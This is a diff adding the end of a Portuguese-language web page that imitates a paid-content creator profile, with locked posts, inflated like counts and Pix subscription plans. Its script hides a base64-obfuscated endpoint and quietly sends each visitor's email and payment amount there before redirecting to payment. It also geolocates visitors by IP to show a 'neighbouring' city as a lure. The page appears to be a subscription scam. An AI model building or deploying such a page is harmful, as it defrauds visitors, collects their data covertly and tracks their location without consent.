+        <span onclick="toast('Chama no direct 😉')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"></circle><path d="M14.5 9.2c-.5-.9-1.4-1.4-2.6-1.4-1.6 0-2.6.8-2.6 1.9 0 2.6 5.4 1.4 5.4 4.2 0 1.2-1.1 2-2.8 2-1.3 0-2.3-.5-2.8-1.5M12 6.2v11.6"></path></svg></span>
+        <span class="bm right" onclick="this.classList.toggle('on');toast(this.classList.contains('on')?'Salvo nos favoritos':'Removido dos favoritos')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3.5h12v17l-6-4.5-6 4.5v-17z"></path></svg></span>
+      </div>
+    </section>
+
+    <section class="card post" id="post5">
+      <div class="post-head">
+        <div class="pa"><img class="pa-img" alt=""></div>
+        <div class="pn">
+          <b>Julia Guimarães
+            <svg width="15" height="15" viewBox="0 0 24 24"><path fill="#3D9DF6" d="M12 1.8l2.5 2 3.2-.4 1 3 2.9 1.5-1 3 1 3-2.9 1.5-1 3-3.2-.4-2.5 2-2.5-2-3.2.4-1-3L2.4 15.4l1-3-1-3 2.9-1.5 1-3 3.2.4z"></path><path fill="#fff" d="M10.6 15.4l-2.9-2.9 1.3-1.3 1.6 1.6 4-4 1.3 1.3z"></path></svg>
+          </b>
+          <small>@JuliaGuimaraes</small>
+        </div>
+        <span class="dots" onclick="toast('Opções do post')">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.8"></circle><circle cx="12" cy="12" r="1.8"></circle><circle cx="12" cy="19" r="1.8"></circle></svg>
+        </span>
+      </div>
+      <div class="locked" onclick="lockedTap()">
+        <svg class="wm" viewBox="0 0 560 620" fill="none" stroke="#FBF7F1" stroke-width="15"><path d="M80 40h400a60 60 0 0 1 60 60v300a60 60 0 0 1-60 60H300L140 600l30-140H80a60 60 0 0 1-60-60V100a60 60 0 0 1 60-60z"></path></svg>
+        <svg class="pad" width="66" height="66" viewBox="0 0 24 24" fill="none" stroke="#7C8DA8" stroke-width="1.6"><rect x="5" y="10.5" width="14" height="10" rx="2.5"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path><circle cx="12" cy="15.5" r="1.3" fill="#7C8DA8" stroke="none"></circle></svg>
+        <div class="lstats">
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="3"></rect><circle cx="8.5" cy="8.5" r="1.6"></circle><path d="M21 15l-5-5L5 21"></path></svg>299</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="6" width="14" height="12" rx="2.5"></rect><path d="M16.5 10.5l5-3v9l-5-3"></path></svg>328</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg>52.2K</span>
+        </div>
+      </div>
+      <div class="media-box" data-slot="foto5"></div>
+      <div class="actions">
+        <span class="heart" onclick="curtir(this)"><svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg></span>
+        <span onclick="toast('Comentários somente para assinantes')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 11.5c0 4.4-4 8-9 8-1.1 0-2.2-.2-3.1-.5L4 20.5l1.6-4C4.6 15.3 4 13.5 4 11.5c0-4.4 4-8 9-8s8 3.6 8 8z"></path></svg></span>
+        <span onclick="toast('Chama no direct 😉')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"></circle><path d="M14.5 9.2c-.5-.9-1.4-1.4-2.6-1.4-1.6 0-2.6.8-2.6 1.9 0 2.6 5.4 1.4 5.4 4.2 0 1.2-1.1 2-2.8 2-1.3 0-2.3-.5-2.8-1.5M12 6.2v11.6"></path></svg></span>
+        <span class="bm right" onclick="this.classList.toggle('on');toast(this.classList.contains('on')?'Salvo nos favoritos':'Removido dos favoritos')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3.5h12v17l-6-4.5-6 4.5v-17z"></path></svg></span>
+      </div>
+    </section>
+
+    <section class="card post" id="post6">
+      <div class="post-head">
+        <div class="pa"><img class="pa-img" alt=""></div>
+        <div class="pn">
+          <b>Julia Guimarães
+            <svg width="15" height="15" viewBox="0 0 24 24"><path fill="#3D9DF6" d="M12 1.8l2.5 2 3.2-.4 1 3 2.9 1.5-1 3 1 3-2.9 1.5-1 3-3.2-.4-2.5 2-2.5-2-3.2.4-1-3L2.4 15.4l1-3-1-3 2.9-1.5 1-3 3.2.4z"></path><path fill="#fff" d="M10.6 15.4l-2.9-2.9 1.3-1.3 1.6 1.6 4-4 1.3 1.3z"></path></svg>
+          </b>
+          <small>@JuliaGuimaraes</small>
+        </div>
+        <span class="dots" onclick="toast('Opções do post')">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.8"></circle><circle cx="12" cy="12" r="1.8"></circle><circle cx="12" cy="19" r="1.8"></circle></svg>
+        </span>
+      </div>
+      <div class="locked" onclick="lockedTap()">
+        <svg class="wm" viewBox="0 0 560 620" fill="none" stroke="#FBF7F1" stroke-width="15"><path d="M80 40h400a60 60 0 0 1 60 60v300a60 60 0 0 1-60 60H300L140 600l30-140H80a60 60 0 0 1-60-60V100a60 60 0 0 1 60-60z"></path></svg>
+        <svg class="pad" width="66" height="66" viewBox="0 0 24 24" fill="none" stroke="#7C8DA8" stroke-width="1.6"><rect x="5" y="10.5" width="14" height="10" rx="2.5"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path><circle cx="12" cy="15.5" r="1.3" fill="#7C8DA8" stroke="none"></circle></svg>
+        <div class="lstats">
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="3"></rect><circle cx="8.5" cy="8.5" r="1.6"></circle><path d="M21 15l-5-5L5 21"></path></svg>299</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="6" width="14" height="12" rx="2.5"></rect><path d="M16.5 10.5l5-3v9l-5-3"></path></svg>328</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg>52.2K</span>
+        </div>
+      </div>
+      <div class="media-box" data-slot="foto6"></div>
+      <div class="actions">
+        <span class="heart" onclick="curtir(this)"><svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg></span>
+        <span onclick="toast('Comentários somente para assinantes')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 11.5c0 4.4-4 8-9 8-1.1 0-2.2-.2-3.1-.5L4 20.5l1.6-4C4.6 15.3 4 13.5 4 11.5c0-4.4 4-8 9-8s8 3.6 8 8z"></path></svg></span>
+        <span onclick="toast('Chama no direct 😉')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"></circle><path d="M14.5 9.2c-.5-.9-1.4-1.4-2.6-1.4-1.6 0-2.6.8-2.6 1.9 0 2.6 5.4 1.4 5.4 4.2 0 1.2-1.1 2-2.8 2-1.3 0-2.3-.5-2.8-1.5M12 6.2v11.6"></path></svg></span>
+        <span class="bm right" onclick="this.classList.toggle('on');toast(this.classList.contains('on')?'Salvo nos favoritos':'Removido dos favoritos')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3.5h12v17l-6-4.5-6 4.5v-17z"></path></svg></span>
+      </div>
+    </section>
+
+    <div class="end-note">Você viu tudo por aqui ✨</div>
+  </div>
+
+  <!-- ============ LIGHTBOX ============ -->
+  <div id="lb" onclick="if(event.target===this)closeLb()">
+    <span class="close" onclick="closeLb()">×</span>
+    <span class="nav prev" onclick="navLb(-1)">‹</span>
+    <span class="nav next" onclick="navLb(1)">›</span>
+    <div id="lbContent"></div>
+    <div class="count" id="lbCount"></div>
+  </div>
+
+  <!-- ============ PAGAMENTO ============ -->
+  <div id="payModal" onclick="if(event.target===this)closePay()">
+    <div class="pay-card">
+      <span class="pay-x" onclick="closePay()">×</span>
+      <div class="pay-title">Finalizar assinatura</div>
+      <div class="pay-sub" id="payPlan"></div>
+      <input type="email" id="payEmail" placeholder="Seu melhor email" autocomplete="email" onkeydown="if(event.key==='Enter')payNow()">
+      <button class="btn-grad" onclick="payNow()">Gerar chave pix</button>
+      <div class="pay-note">Pagamento seguro via Pix 🔒 · Seu acesso chega no seu email</div>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+</div>
+
+<script>
+/* ============ TOAST ============ */
+let toastT;
+function toast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.classList.add('show');
+  clearTimeout(toastT);
+  toastT=setTimeout(()=>t.classList.remove('show'),2200);
+}
+
+/* ============ PAGAMENTO ============ */
+const PLANS={
+  big:{label:'Assinar agora R$ 19,96', value:19.90, link:'https://app.pushinpay.com.br/service/pay/A08AAFDC-1B3E-4575-AEC6-BC4B1278255A'},
+  m3:{label:'3 meses (50% off ) — R$ 74,85', value:74.00, link:'https://app.pushinpay.com.br/service/pay/A2EF646C-C516-4271-BF9D-88C922E6B3FA'},
+  m6:{label:'6 meses (50% off ) — R$ 149,70', value:150.00, link:'https://app.pushinpay.com.br/service/pay/A058574B-547A-48AA-87E8-8F2E729ACFFA'}
+};
+const WK='aHR0cHM6Ly9wcml2YWN5LW1haWwubHVjYXNtaW5lbGx5ODgud29ya2Vycy5kZXY=';
+function openPay(k){
+  document.getElementById('payPlan').textContent=PLANS[k].label;
+  document.getElementById('payModal').dataset.link=PLANS[k].link;
+  document.getElementById('payModal').dataset.value=PLANS[k].value;
+  document.getElementById('payEmail').value='';
+  document.getElementById('payModal').classList.add('open');
+  document.body.style.overflow='hidden';
+}
+function closePay(){
+  document.getElementById('payModal').classList.remove('open');
+  document.body.style.overflow='';
+}
+function payNow(){
+  const v=document.getElementById('payEmail').value.trim();
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){toast('Digite um email válido');return;}
+  const link=document.getElementById('payModal').dataset.link;
+  try{
+    fetch(atob(WK)+'/start',{method:'POST',mode:'cors',keepalive:true,
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({email:v,value:Number(document.getElementById('payModal').dataset.value)})}).catch(()=>{});
+  }catch(e){}
+  window.location.href=link;
+}
+
+/* ============ POST TRANCADO ============ */
+function lockedTap(){
+  toast(document.body.classList.contains('subbed')
+    ? 'Conteúdo sendo preparado ✨'
+    : 'Assine para desbloquear 🔒');
+}
+
+/* ============ ABRIR/FECHAR PLANOS ============ */
+function toggleSub(){
+  const s=document.querySelector('.p-sub'),l=document.getElementById('subList');
+  const closed=s.classList.toggle('closed');
+  l.style.display=closed?'none':'';
+}
+
+/* ============ TESTAR IMAGEM ============ */
+const IMG_EXT=['jpg','jpeg','png','webp','gif','JPG','JPEG','PNG','WEBP','GIF'];
+
+function testImg(url){
+  return new Promise(res=>{const i=new Image();i.onload=()=>res(url);i.onerror=()=>res(null);i.src=url;});
+}
+
+/* ============ LIGHTBOX ============ */
+let lbItems=[],lbIdx=0;
+function collectItems(){
+  lbItems=[];
+  document.querySelectorAll('.media-box img').forEach(im=>lbItems.push({type:'img',url:im.src}));
+}
+function openLb(url,type,idx){
+  collectItems();
+  lbIdx=Math.max(0,lbItems.findIndex(i=>i.url===url));
+  showLb();
+  document.getElementById('lb').classList.add('open');
+  document.body.style.overflow='hidden';
+}
+function showLb(){
+  const it=lbItems[lbIdx];
+  const c=document.getElementById('lbContent');
+  if(!it){c.innerHTML='';return;}
+  c.innerHTML=it.type==='img'
+    ?'<img src="'+it.url+'" alt="">'
+    :'<video src="'+it.url+'" controls autoplay playsinline style="max-width:100%;max-height:100%"></video>';
+  document.getElementById('lbCount').textContent=(lbIdx+1)+' / '+lbItems.length;
+}
+function navLb(d){
+  if(!lbItems.length)return;
+  lbIdx=(lbIdx+d+lbItems.length)%lbItems.length;
+  showLb();
+}
+function closeLb(){
+  document.getElementById('lb').classList.remove('open');
+  document.getElementById('lbContent').innerHTML='';
+  document.body.style.overflow='';
+}
+document.addEventListener('keydown',e=>{
+  if(!document.getElementById('lb').classList.contains('open'))return;
+  if(e.key==='Escape')closeLb();
+  if(e.key==='ArrowLeft')navLb(-1);
+  if(e.key==='ArrowRight')navLb(1);
+});
+// swipe
+let sx=null;
+document.getElementById('lb').addEventListener('touchstart',e=>sx=e.touches[0].clientX,{passive:true});
+document.getElementById('lb').addEventListener('touchend',e=>{
+  if(sx===null)return;
+  const dx=e.changedTouches[0].clientX-sx;
+  if(Math.abs(dx)>50)navLb(dx<0?1:-1);
+  sx=null;
+},{passive:true});
+
+/* ============ CURTIR ============ */
+function curtir(el){
+  el.classList.toggle('on');
+  toast(el.classList.contains('on')?'Curtido ❤️':'Curtida removida');
+}
+
+/* ============ CARREGAR FOTOS DO PERFIL ============ */
+(async function(){
+  // capa
+  for(const e of IMG_EXT){
+    const u=await testImg('fotos/banner.'+e);
+    if(u){document.getElementById('imgBanner').src=u;break;}
+  }
+  // avatar
+  for(const e of IMG_EXT){
+    const u=await testImg('fotos/perfil.'+e);
+    if(u){
+      document.getElementById('imgAvatar').src=u;
+      document.getElementById('offerAv').src=u;
+      document.querySelectorAll('.pa-img').forEach(a=>a.src=u);
+      break;
+    }
+  }
+})();
+
+/* ============ LOCALIZAÇÃO POR IP (cidade vizinha) ============ */
+const toRad = x => x * Math.PI / 180;
+function haversine(la1, lo1, la2, lo2) {
+  const R = 6371;
+  const dLa = toRad(la2 - la1), dLo = toRad(lo2 - lo1);
+  const a = Math.sin(dLa / 2) ** 2 +
+    Math.cos(toRad(la1)) * Math.cos(toRad(la2)) * Math.sin(dLo / 2) ** 2;
+  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+}
+const norm = s => (s || '').toLowerCase()
+  .normalize('NFD').replace(/[\u0300-\u036f]/g, '').trim();
+
+// Busca cidades/tvilas reais num raio de ~30km e devolve a mais próxima
+// diferente da cidade detectada (ou seja, uma VIZINHA).
+async function findNeighborCity(lat, lon, detectedCity) {
+  const q = `[out:json][timeout:15];
+    (
+      node(around:30000,${lat},${lon})["place"~"city|town|village"]["name"];
+      way(around:30000,${lat},${lon})["place"~"city|town"]["name"];
+    );
+    out tags center 30;`;
+  const resp = await fetch('https://overpass-api.de/api/interpreter', {
+    method: 'POST',
+    body: 'data=' + encodeURIComponent(q)
+  });
+  const data = await resp.json();
+  const detectada = norm(detectedCity);
+  const cidades = (data.elements || [])
+    .filter(e => e.tags && e.tags.name)
+    .map(e => ({
+      nome: e.tags.name,
+      km: haversine(lat, lon,
+        e.lat ?? e.center?.lat,
+        e.lon ?? e.center?.lon)
+    }))
+    .filter(c => norm(c.nome) !== detectada && c.km >= 1 && c.km <= 30)
+    .sort((a, b) => a.km - b.km);
+  return cidades.length ? cidades[0].nome : null;
+}
+
+async function detectLocation() {
+  // Passo 1: achar onde o IP está
+  let geo = null;
+  try {
+    const r = await fetch('https://ipwho.is/');
+    const d = await r.json();
+    if (d && d.success && d.city) {
+      geo = { city: d.city, lat: d.latitude, lon: d.longitude };
+    }
+  } catch (e) { /* tenta a próxima */ }
+
+  if (!geo) {
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const d = await r.json();
+      if (d && d.city) {
+        geo = { city: d.city, lat: d.latitude, lon: d.longitude };
+      }
+    } catch (e) { /* última opção */ }
+  }
+
+  if (!geo || geo.lat == null) return; // mantém São Paulo
+
+  // Passo 2: achar uma cidade VIZINHA da detectada
+  try {
+    const vizinha = await findNeighborCity(geo.lat, geo.lon, geo.city);
+    if (vizinha) {
+      document.getElementById('locCity').textContent = vizinha;
+      return;
+    }
+  } catch (e) { /* cai no fallback */ }
+
+  // Fallback: mostra a própria cidade detectada
+  document.getElementById('locCity').textContent = geo.city;
+}
+
+detectLocation();
+</script>
+
+</body></html>
